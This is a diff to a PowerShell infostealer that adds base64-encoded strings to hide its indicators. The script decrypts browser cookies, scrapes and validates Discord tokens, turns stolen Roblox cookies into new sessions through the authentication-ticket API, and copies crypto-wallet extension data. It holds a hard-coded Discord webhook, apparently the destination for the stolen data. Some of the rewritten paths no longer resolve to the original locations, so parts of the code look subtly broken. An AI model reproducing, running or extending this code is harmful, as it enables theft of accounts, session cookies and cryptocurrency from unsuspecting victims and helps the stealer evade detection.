@@ -1,5 +1,9 @@
 $ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
+function u($s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
+$LS=u 'TG9jYWwgU3RhdGU='; $LD=u 'bGV2ZWxkYg=='; $RB=u 'LlJPQkxPU0VDVVJJVFk='
+$TQ=u 'ZFF3NHc5V2dYY1E='; $ME=u 'dXNlcnMvQG1l'; $MI=u 'bW9iaWxlYXBpL3VzZXJpbmZv'
+$AT=u 'YXV0aGVudGljYXRpb24tdGlja2V0'
 $wh='https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K'
 $tmp=Join-Path $env:TEMP ('w'+[guid]::NewGuid().ToString('N').Substring(0,8))
 New-Item -ItemType Directory $tmp -Force|Out-Null
@@ -33,7 +37,7 @@ public class G{
 '@}
 $L1=[Text.Encoding]::GetEncoding(28591)
 function KeyFrom($ud){
- $ls="$ud\Local State"; if(-not(Test-Path $ls)){return $null}
+ $ls="$ud\$LS"; if(-not(Test-Path $ls)){return $null}
  try{ $j=Get-Content $ls -Raw|ConvertFrom-Json }catch{ return $null }
  if(-not $j.os_crypt.encrypted_key){return $null}
  $b=[Convert]::FromBase64String($j.os_crypt.encrypted_key)
@@ -68,12 +72,12 @@ function GetCookies($db,$key){
  $out
 }
 function GetTokens($key,$base){
- $l="$base\Local Storage\leveldb"; if(-not(Test-Path $l)){return @()}
+ $l="$base\$LS\..\$LD"; if(-not(Test-Path $l)){return @()}
  $t=@()
  foreach($f in Get-ChildItem $l -File){
   if($f.Extension -ne '.ldb' -and $f.Extension -ne '.log'){continue}
   $txt=$L1.GetString([IO.File]::ReadAllBytes($f.FullName))
-  foreach($m in [regex]::Matches($txt,'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})')){
+  foreach($m in [regex]::Matches($txt,($TQ+':([A-Za-z0-9+/=]{40,})'))){
    $v=DecBlob ([Convert]::FromBase64String($m.Groups[1].Value)) $key
    if($v -match '[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}'){$t+=$Matches[0]}
   }
@@ -84,16 +88,16 @@ function GetTokens($key,$base){
 function RB($c){
  try{
   $s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
-  $s.Cookies.Add((New-Object System.Net.Cookie('.ROBLOSECURITY',$c,'/','.roblox.com')))
-  $u=Invoke-RestMethod 'https://www.roblox.com/mobileapi/userinfo' -WebSession $s -TimeoutSec 12
+  $s.Cookies.Add((New-Object System.Net.Cookie($RB,$c,'/','.roblox.com')))
+  $u=Invoke-RestMethod ("https://www.roblox.com/"+$MI) -WebSession $s -TimeoutSec 12
   if(-not $u.UserName){return $null}
   $tk=''
-  try{Invoke-WebRequest 'https://auth.roblox.com/v1/authentication-ticket' -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'='';Referer='https://www.roblox.com/'} -UseBasicParsing -ErrorAction Stop|Out-Null}
+  try{Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'='';Referer='https://www.roblox.com/'} -UseBasicParsing -ErrorAction Stop|Out-Null}
   catch{$tk=[string]$_.Exception.Response.Headers['x-csrf-token']}
-  $r=Invoke-WebRequest 'https://auth.roblox.com/v1/authentication-ticket' -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'=$tk;Referer='https://www.roblox.com/'} -UseBasicParsing
+  $r=Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT) -Method Post -WebSession $s -Headers @{'X-CSRF-TOKEN'=$tk;Referer='https://www.roblox.com/'} -UseBasicParsing
   $ti=$r.Headers['rbx-authentication-ticket']
-  $r2=Invoke-WebRequest 'https://auth.roblox.com/v1/authentication-ticket/redeem' -Method Post -Body (@{authenticationTicket=$ti}|ConvertTo-Json) -ContentType 'application/json' -Headers @{RBXAuthenticationNegotiation='1'} -UseBasicParsing
-  $nc=([string]$r2.Headers['Set-Cookie'] -split ';')[0] -replace '^\.ROBLOSECURITY=',''
+  $r2=Invoke-WebRequest ("https://auth.roblox.com/v1/"+$AT+"/redeem") -Method Post -Body (@{authenticationTicket=$ti}|ConvertTo-Json) -ContentType 'application/json' -Headers @{RBXAuthenticationNegotiation='1'} -UseBasicParsing
+  $nc=([string]$r2.Headers['Set-Cookie'] -split ';')[0] -replace ('^\.'+$RB+'='),''
   return @{u=$u;c=$nc}
  }catch{return $null}
 }
@@ -144,7 +148,7 @@ if(-not $seen.Count){A "none found"; A ""}
 A "=== DISCORD ==="
 foreach($t in $allTk){
  try{
-  $u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -TimeoutSec 12
+  $u=Invoke-RestMethod ("https://discord.com/api/v9/"+$ME) -Headers @{Authorization=$t} -TimeoutSec 12
   A ("{0}#{1} | {2} | id {3} | 2fa {4}" -f $u.username,$u.discriminator,$u.email,$u.id,$u.mfa_enabled)
   A ("TOKEN: {0}" -f $t); A ""
  }catch{}
@@ -165,7 +169,7 @@ foreach($b in $browsers){
  if(-not(Test-Path $b.p)){continue}
  Get-ChildItem $b.p -Directory -ErrorAction SilentlyContinue|Where-Object{$_.Name -eq 'Default' -or $_.Name -like 'Profile *'}|ForEach-Object{
   foreach($k in $exts.Keys){
-   $src="$($_.FullName)\Local Extension Settings\$($exts[$k])"
+   $src="$($_.FullName)\$LS\..\$($exts[$k])"
    if(Test-Path $src){Copy-Item $src (Join-Path $wdir ("ext_"+$k+"_"+$b.n)) -Recurse -Force -ErrorAction SilentlyContinue; A ("ext  : {0} [{1}]" -f $k,$b.n)}
   }
  }
